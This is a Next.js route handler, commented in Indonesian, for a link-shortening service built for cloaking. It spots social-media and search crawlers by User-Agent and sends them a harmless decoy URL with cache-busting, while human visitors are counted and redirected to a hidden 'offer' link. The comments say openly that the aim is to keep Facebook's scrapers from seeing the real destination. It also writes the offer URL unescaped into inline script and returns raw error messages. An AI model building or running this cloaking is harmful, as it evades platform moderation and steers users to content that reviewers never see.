import { turso } from "@/lib/turso";
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';
export const fetchCache = 'force-no-store';

export async function GET(request, { params }) {
  try {
    const resolvedParams = await params;
    const shortcode = resolvedParams.shortcode;

    // 1. Baca identitas (User-Agent)
    const userAgent = request.headers.get('user-agent') || '';

    // 2. Deteksi Bot Sosial Media MURNI (Scraper)
    const isBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|googlebot|bingbot|slurp|spider/i.test(userAgent);

    // 3. Cari data link
    const result = await turso.execute({
      sql: "SELECT * FROM links WHERE short_code = ?",
      args: [shortcode]
    });

    if (result.rows.length === 0) {
      return NextResponse.redirect(new URL('/', request.url));
    }

    const data = result.rows[0];

    // ==========================================
    // SENJATA ANTI-CACHE (Angka Acak)
    // ==========================================
    const randomNum = Math.floor(Math.random() * 10000000);

    const noCacheHeaders = {
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
      'Pragma': 'no-cache',
      'Expires': '0',
    };

    // ==========================================
    // LOGIKA CLOAKING FINAL
    // ==========================================

    if (isBot) {
      // BOT FB -> Lempar pakai 307 + Cache Buster (Biar FB gak nyimpen jejak)
      let fakeUrl = data.fake_link || 'google.com'; 
      if (!fakeUrl.startsWith('http')) fakeUrl = 'https://' + fakeUrl;
      
      const separator = fakeUrl.includes('?') ? '&' : '?';
      fakeUrl = `${fakeUrl}${separator}cb=${randomNum}`;
      
      return NextResponse.redirect(new URL(fakeUrl), { 
        status: 307, // KUNCI MUTLAK BIAR FB GAK NYIMPEN URL FAKE
        headers: noCacheHeaders 
      });
      
    } else {
      // MANUSIA (FB Biru, FB Lite, dll) -> JS Redirect (Biar gak blank hitam)
      await turso.execute({
        sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
        args: [shortcode]
      });

      let offerUrl = data.offer_link || 'google.com';
      if (!offerUrl.startsWith('http')) offerUrl = 'https://' + offerUrl;
      
      const separator = offerUrl.includes('?') ? '&' : '?';
      offerUrl = `${offerUrl}${separator}cb=${randomNum}`;
      
      // Halaman putih super ringan yang langsung pindah dalam hitungan milidetik
      const html = `
        <!DOCTYPE html>
        <html>
          <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="refresh" content="0;url=${offerUrl}">
            <title>Loading...</title>
            <script>
              window.location.replace("${offerUrl}");
            </script>
          </head>
          <body style="background-color: #ffffff;"></body>
        </html>
      `;

      return new NextResponse(html, {
        status: 200, // FB mengira ini halaman biasa jadi gak bakal nge-blank
        headers: {
          'Content-Type': 'text/html',
          ...noCacheHeaders
        },
      });
    }

  } catch (error) {
    console.error("System Error Route:", error);
    return new NextResponse("Server Crash: " + error.message, { status: 500 });
  }
}
